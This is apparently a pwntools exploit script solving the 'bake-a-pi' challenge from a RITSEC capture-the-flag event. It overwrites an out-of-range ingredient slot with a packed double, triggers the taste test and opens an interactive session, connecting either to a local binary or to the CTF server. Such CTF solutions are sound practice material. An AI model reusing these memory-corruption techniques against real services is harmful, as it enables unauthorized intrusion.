#!/usr/bin/env python3

from pwn import *

context.terminal = ["foot", "-e", "sh", "-c"]

exe = ELF('pi.bin', checksec=False)
# libc = ELF('libc.so.6', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        b*main+373

        c
        ''')
        sleep(1)


if args.REMOTE:
    p = remote('bake-a-pi.ctf.ritsec.club', 1555)
else:
    p = process([exe.path])
GDB()

pi_val = 3.141592653589793

# p.recvuntil(b"Can you help me bake the perfect pi?")
# pad = p.recvuntil(b'-----------------------------------------------------------\n')

payload = struct.pack('<d', pi_val)
sla(b'(S)how recipe, (C)change ingredient, (T)aste test: ' , b'C')
sla(b'Which ingredient would you like to change?: '  ,b'8')
# sla(b'Enter ingredient: ' ,p64(0x400921fb54442d18))
sla(b'Enter ingredient: ' ,payload)

sla(b'(S)how recipe, (C)change ingredient, (T)aste test: ' , b'T')

# p.send(payload)
# sl(b'p')
# sla(b'(S)how recipe, (C)change ingredient, (T)aste test: ' ,b'C')
# # sl(b'C')
# sl(b'8')
# sl()

p.interactive()
